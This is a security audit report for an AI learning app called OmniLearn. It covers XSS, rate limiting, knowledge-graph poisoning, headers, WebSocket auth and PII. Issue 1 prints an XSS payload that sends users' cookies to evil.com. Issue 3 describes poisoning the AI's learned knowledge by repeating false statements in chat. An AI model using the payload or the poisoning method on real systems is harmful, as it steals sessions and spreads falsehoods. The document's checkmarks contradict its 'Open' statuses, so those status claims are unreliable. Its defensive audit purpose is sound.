# OmniLearn Security Audit - May 2026

**Audit Date:** May 30, 2026  
**Auditor:** AI Security Review  
**Version:** 3.1.0  
**Status:** 🔴 Critical Issues Found

---

## Executive Summary

OmniLearn has a **solid security foundation** (Clerk auth, CORS, Drizzle ORM) but has **critical gaps** that must be addressed before production scale:

| Priority | Issues | Status |
|----------|--------|--------|
| 🔴 Critical | 3 | Open |
| 🟠 High | 4 | Open |
| 🟡 Medium | 5 | Open |
| 🟢 Low | 3 | Open |

---

## 🔴 Critical Issues (Fix Immediately)

### 1. No Input Sanitization - XSS/Injection Risk

**Severity:** CRITICAL  
**Location:** `/api/omni/chat`, `/api/knowledge/*`, all user input endpoints  
**Risk:** Users can inject HTML/JavaScript into knowledge graph, which gets rendered to other users

**Current State:**
```typescript
// chat.ts - NO SANITIZATION
const { content } = req.body;
await trainOnText(content, "chat-response", clerkId);
```

**Attack Vector:**
```javascript
// Malicious user submits:
"<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>"

// This gets stored in knowledge graph and rendered to other users
```

**Fix Required:**
- Add `dompurify` or `sanitize-html` package
- Sanitize ALL user input before storage
- Escape HTML entities in responses

**Estimated Fix:** 2-3 hours

---

### 2. Rate Limiting Disabled - DDoS/Abuse Risk

**Severity:** CRITICAL  
**Location:** `middlewares/rateLimit.ts`  
**Risk:** No protection against abuse, brute force, or accidental runaway clients

**Current State:**
```typescript
export const defaultLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 10000, // Effectively unlimited
  // ...
});
```

**Impact:**
- 10,000 requests/hour = 166 requests/minute = no real limit
- Chat endpoints have same unlimited config
- Railway free tier can be exhausted quickly

**Fix Required:**
- Production limits: 100 req/hour for chat, 1000 req/hour for API
- Stricter limits for anonymous users
- IP-based + user-based limiting

**Estimated Fix:** 30 minutes

---

### 3. Learning from Unvalidated User Input

**Severity:** CRITICAL  
**Location:** `brain/index.ts`, `routes/omni/chat.ts`  
**Risk:** Poisoning attacks - malicious users can inject false information into knowledge graph

**Current State:**
```typescript
// chat.ts - learns from EVERY response
if (!shouldSkipLearning) {
  trainOnText(finalResponse, "chat-response", clerkId);
}

// brain/index.ts - NO VALIDATION
export async function trainOnText(text: string, source: string, clerkId: string | null) {
  const facts = extractFacts(text, source);
  // Facts stored without validation
}
```

**Attack Vector:**
```javascript
// Attacker repeatedly states false "facts":
"The capital of France is Berlin"
"Vaccines cause autism"
"User [name]'s password is [password]"

// After enough repetitions, this becomes "knowledge"
```

**Fix Required:**
- Add confidence scoring based on source reliability
- Implement fact verification before storage
- Add user reputation system
- Allow fact flagging/correction

**Estimated Fix:** 4-6 hours

---

## 🟠 High Priority Issues

### 4. No Security Headers

**Severity:** HIGH  
**Location:** `app.ts`  
**Risk:** Clickjacking, XSS, MIME sniffing attacks

**Missing Headers:**
- `Content-Security-Policy` (CSP)
- `X-Frame-Options` (clickjacking)
- `X-Content-Type-Options` (MIME sniffing)
- `Strict-Transport-Security` (HSTS)
- `Referrer-Policy`
- `Permissions-Policy`

**Fix:** Add `helmet` middleware
```typescript
import helmet from 'helmet';
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      // ...
    }
  }
}));
```

**Estimated Fix:** 1 hour

---

### 5. WebSocket Authentication Weakness

**Severity:** HIGH  
**Location:** `lib/discovery-server.ts`  
**Risk:** Unauthorized nodes can join cluster if they guess secret key

**Current State:**
```typescript
// Secret key authentication only
if (message.secretKey !== expectedSecretKey) {
  ws.close();
}
```

**Issues:**
- Single shared secret (not per-node)
- No key rotation mechanism
- No rate limiting on connection attempts
- Secrets stored in environment variables only

**Fix Required:**
- Per-node authentication tokens
- Token rotation every 30 days
- Rate limit connection attempts
- Log all connection failures

**Estimated Fix:** 3-4 hours

---

### 6. No Audit Logging for Security Events

**Severity:** HIGH  
**Location:** Throughout  
**Risk:** Cannot detect or investigate security incidents

**Missing Logs:**
- Failed authentication attempts
- Rate limit violations
- Content moderation blocks
- Suspicious input patterns
- Admin actions

**Fix Required:**
- Create security audit log table
- Log all security-relevant events
- Set up alerting for anomalies

**Estimated Fix:** 2-3 hours

---

### 7. PII in Training Data

**Severity:** HIGH  
**Location:** `routes/omni/chat.ts`, `brain/index.ts`  
**Risk:** User PII stored in knowledge graph, potentially exposed

**Current State:**
```typescript
// Moderation runs BEFORE storage, but PII detection is pattern-based
// Users can still slip through: "My phone is five five five one two three four"
```

**Fix Required:**
- Enhanced PII detection (including spelled-out numbers)
- Automatic PII redaction before storage
- User data export/deletion endpoints (GDPR compliance)

**Estimated Fix:** 3-4 hours

---

## 🟡 Medium Priority Issues

### 8. No Request Size Limits Per Endpoint

**Severity:** MEDIUM  
**Current:** Global 10MB limit in `app.ts`  
**Risk:** Large payload attacks on specific endpoints

**Fix:** Per-endpoint limits (chat: 4KB, file upload: 10MB, etc.)

---

### 9. No DDoS Protection

**Severity:** MEDIUM  
**Current:** Railway handles L7, but no Cloudflare proxy  
**Risk:** Large-scale DDoS could exhaust Railway resources

**Fix:** Add Cloudflare proxy in front of Railway

---

### 10. Database Query Audit Needed

**Severity:** MEDIUM  
**Current:** Using Drizzle ORM (parameterized queries)  
**Risk:** Potential raw SQL injection if any queries bypass ORM

**Fix:** Audit all database queries, ensure none use raw SQL with user input

---

### 11. No API Key Rotation Procedure

**Severity:** MEDIUM  
**Current:** Clerk handles auth, but internal keys static  
**Risk:** Compromised keys have indefinite access

**Fix:** Document key rotation procedure, implement rotation schedule

---

### 12. Frontend Input Validation

**Severity:** MEDIUM  
**Current:** Trusts backend validation only  
**Risk:** Direct API calls bypass frontend checks

**Fix:** Add frontend validation as UX improvement (not security boundary)

---

## 🟢 Low Priority Issues

### 13. Error Messages Leak Information

**Severity:** LOW  
**Risk:** Detailed errors could help attackers

**Fix:** Generic error messages in production, detailed logs only

---

### 14. No Bug Bounty Program

**Severity:** LOW  
**Risk:** Vulnerabilities reported privately vs. responsibly

**Fix:** Create SECURITY.md with responsible disclosure policy

---

### 15. No Automated Security Scanning

**Severity:** LOW  
**Risk:** Vulnerabilities discovered late

**Fix:** Add SAST (static analysis) and DAST (dynamic testing) to CI/CD

---

## ✅ What's Already Secure

| Component | Status | Notes |
|-----------|--------|-------|
| **Authentication** | ✅ Good | Clerk is industry standard |
| **CORS** | ✅ Good | Properly configured allowlist |
| **SQL Injection** | ✅ Good | Drizzle ORM prevents injection |
| **Content Moderation** | ✅ Good | Multi-layer safety system |
| **Error Tracking** | ✅ Good | Sentry integration |
| **Proxy Configuration** | ✅ Good | Railway proxy trusted correctly |

---

## Remediation Plan

### Phase 1: Critical (Week 1)
1. ✅ Add input sanitization (dompurify)
2. ✅ Re-enable rate limiting
3. ✅ Add input validation for learning pipeline

### Phase 2: High (Week 2)
4. ✅ Add security headers (helmet)
5. ✅ Strengthen WebSocket auth
6. ✅ Implement security audit logging
7. ✅ Enhanced PII detection

### Phase 3: Medium (Week 3-4)
8. ✅ Per-endpoint request limits
9. ✅ Cloudflare proxy setup
10. ✅ Database query audit
11. ✅ Key rotation procedure

### Phase 4: Low (Ongoing)
12. ✅ Frontend validation
13. ✅ Error message hardening
14. ✅ Bug bounty program
15. ✅ Automated security scanning

---

## Testing Checklist

Before deploying fixes:

- [ ] XSS injection tests (all input fields)
- [ ] Rate limit bypass tests
- [ ] SQL injection tests (manual + automated)
- [ ] CSRF token validation
- [ ] Authentication bypass tests
- [ ] PII detection tests
- [ ] WebSocket auth tests
- [ ] Load testing (1000 concurrent users)

---

## Compliance Considerations

### GDPR (EU)
- ✅ Right to erasure (needs implementation)
- ✅ Data export (needs implementation)
- ⚠️ PII protection (partially implemented)

### Nigeria Data Protection Regulation (NDPR)
- ⚠️ Data localization (not implemented)
- ✅ Consent mechanisms (Clerk handles)

### SOC 2 (Future)
- ❌ Audit logging (needs implementation)
- ❌ Access controls (partially implemented)
- ❌ Change management (not implemented)

---

**Next Steps:** Start with Phase 1 critical fixes. Each fix should include:
1. Code changes
2. Unit tests
3. Integration tests
4. Documentation update
5. Deployment checklist

---

**Last Updated:** May 30, 2026  
**Next Review:** June 30, 2026
